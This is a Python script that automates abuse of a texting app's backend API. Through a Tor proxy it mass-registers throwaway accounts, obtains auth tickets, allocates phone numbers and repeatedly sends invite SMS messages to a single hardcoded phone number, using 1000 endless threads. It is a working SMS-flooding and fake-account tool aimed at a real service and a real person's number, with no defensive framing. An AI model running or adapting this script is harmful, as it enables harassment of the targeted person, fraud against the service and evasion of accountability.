import json
import requests
import random
import uuid
import threading


def send_message(udid, token, number, userId): 


    headers = {
        
        "udid" : udid,
        "authorization" : "CASST " + token,
        "content-type" : "application/json",
        "user-agent" : "okhttp/3.10.0"
        
    }
    
    
    data = {
    	"message": "dont put your api keys in your js code",
    	"invites": [{
    		"phone": number
    	}]
    }
    #print(json.dumps(data));
    
    res = requests.post("https://ums.prd.gii.me/rewards/custom_invites/"+userId, proxies = {"http" : "socks4://localhost:9050", "https" : "socks4://localhost:9050"}, data=json.dumps(data), headers=headers)
    
    #print(res.content)

def post_device(udid, account_location, grant_ticket):
    
    
    headers = {
        
        "udid" : udid,
        "authorization" : "CASST " + grant_ticket,
        "content-type" : "application/json",
        "user-agent" : "okhttp/3.10.0"
        
    }
    
    data = {
        "appName": "textplus",
        "appVersion": "7.4.8",
        "deviceUDID": udid,
        "model": "unknown",
        "platform": "google",
        "platformOSVersion": "5.1.1",
        "pushEnabled": "true",
        "pushToken": "ezCUG_8kIYs:APA91bE_VxGm1lz2Ev2nKcxx13AAI7ZkaptVdP3Q5i91ipfxrLVJlKkcPiVU8GRg48g0E_yzKYP77cN3DhxIiFN7sIDDdWxmjIuWaEW2csEBHfLPr1G5gxqhlgr0wFu6o8MJakeCV6ru",
        "pushTokenType": "ANDROID_GCM",
        "pushType": "2",
        "user": account_location
    }
    
    res = requests.post("https://ums.prd.gii.me/v2/devices", proxies = {"http" : "socks4://localhost:9050", "https" : "socks4://localhost:9050"}, data=json.dumps(data), headers=headers)
    
    #print(res.status_code)

def persona_search(jid, udid, grant_ticket):
    
    headers = {
        
        "udid" : udid,
        "authorization" : "CASST " + grant_ticket,
        "content-type" : "application/json",
        "user-agent" : "okhttp/3.10.0"
        
    }
    
    
    res = requests.get("https://ums.prd.gii.me/personas/search/findByJidIn?jid="+jid+"&network=nextplus&size=1&projection=inline",proxies = {"http" : "socks4://localhost:9050", "https" : "socks4://localhost:9050"}, headers=headers)

def get_persona_info(udid, grant_ticket):
    
    
    
    headers = {
        
        "udid" : udid,
        "authorization" : "CASST " + grant_ticket,
        "content-type" : "application/json",
        "user-agent" : "okhttp/3.10.0"
        
    }
    
    
    res = requests.get("https://ums.prd.gii.me/me?projection=inline", proxies = {"http" : "socks4://localhost:9050", "https" : "socks4://localhost:9050"}, headers=headers)
    
    return json.loads(res.content)


def get_number(udid, grant_ticket):
    url_location = get_persona_info(udid, grant_ticket)["personas"][0]["id"]
    #print("persona locaiton: " + url_location)
    headers = {
        
        "udid" : udid,
        "authorization" : "CASST " + grant_ticket,
        "content-type" : "application/json",
        "user-agent" : "okhttp/3.10.0",
        "network" : "nextplus"
        
    }
    
    data = {
        
        "deviceUdid": udid,
        "localeId": "0191a213fc4645fbba31d44d63ea1720",
        "platform": "google",
        "pushToken": "ezCUG_8kIYs:APA91bE_VxGm1lz2Ev2nKcxx13AAI7ZkaptVdP3Q5i91ipfxrLVJlKkcPiVU8GRg48g0E_yzKYP77cN3DhxIiFN7sIDDdWxmjIuWaEW2csEBHfLPr1G5gxqhlgr0wFu6o8MJakeCV6ru"
    }
    res = requests.post("https://ums.prd.gii.me/personas/"+url_location+"/tptn/allocate", proxies = {"http" : "socks4://localhost:9050", "https" : "socks4://localhost:9050"}, data=json.dumps(data), headers=headers)
    #print(res.content)


def grant_token(ticket, udid):
    
    headers = {
        
        "udid" : udid,
        "content-type" : "application/json",
        "user-agent" : "okhttp/3.10.0"
        
    }
    data = {
        
        "service" : "nextplus",
        "ticketGrantingTicket" : ticket
        
    }
    res = requests.post("https://cas.prd.gii.me/v2/ticket/service", proxies = {"http" : "socks4://localhost:9050", "https" : "socks4://localhost:9050"}, data=json.dumps(data), headers=headers)
    
    return json.loads(res.content)["ticket"]



def get_ticket(username, udid):
    
    headers = {
        
        "udid" : udid,
        "content-type" : "application/json",
        "user-agent" : "okhttp/3.10.0"
        
    }
    data = {
        
        "password" : "somepass",
        "username" : username
        
    }
    res = requests.post("https://cas.prd.gii.me/v2/ticket/ticketgranting/user", proxies = {"http" : "socks4://localhost:9050", "https" : "socks4://localhost:9050"}, data=json.dumps(data), headers=headers)

    return json.loads(res.content)["ticket"]

def make_user(udid):
    
    headers = {
        
        "udid" : udid,
        "content-type" : "application/json",
        "user-agent" : "okhttp/3.10.0"
        
    }
    
    data = {
        "avatarUrl": "",
        "country": "US",
        "locale": "en_US",
        "network": "nextplus",
        "optin": 1,
        "password": "somepass",
        "tos": 1,
        "username": str(uuid.uuid1())
    }
    
    res = requests.post("https://ums.prd.gii.me/registration/mobile", proxies = {"http" : "socks4://localhost:9050", "https" : "socks4://localhost:9050"}, data=json.dumps(data), headers=headers)
    return res.headers["username"], res.headers["location"]

def send_thread():
    
    while True:
        
    
            udid = str('{:16}'.format(random.randrange(1, 10**18)))
            #print("UDID: " + udid)
            username, account_location = make_user(udid)
                        
            userId = account_location.split('/')[len(account_location.split('/'))-1]
            #print("USER ID: " + userId)
            #print("USERNAME: " + username)
            #print("account location: " + account_location)
            ticket = get_ticket(username, udid)
            #print(ticket)
            grant_ticket = grant_token(ticket, udid)
            #print(grant_ticket)
            jid = get_persona_info(udid, grant_ticket)["personas"][0]["jid"]
            #print("JID: " + jid)
            persona_search(jid, udid, grant_ticket)
            post_device(udid, account_location, grant_ticket)
            get_number(udid, grant_ticket)
            for i in range(3):
                send_message(udid, grant_ticket, "+18312878759", userId)
                print("Another message sent!")

def main():
    for i in range(1000):
        threading.Thread(target=send_thread, args=()).start()
    
main()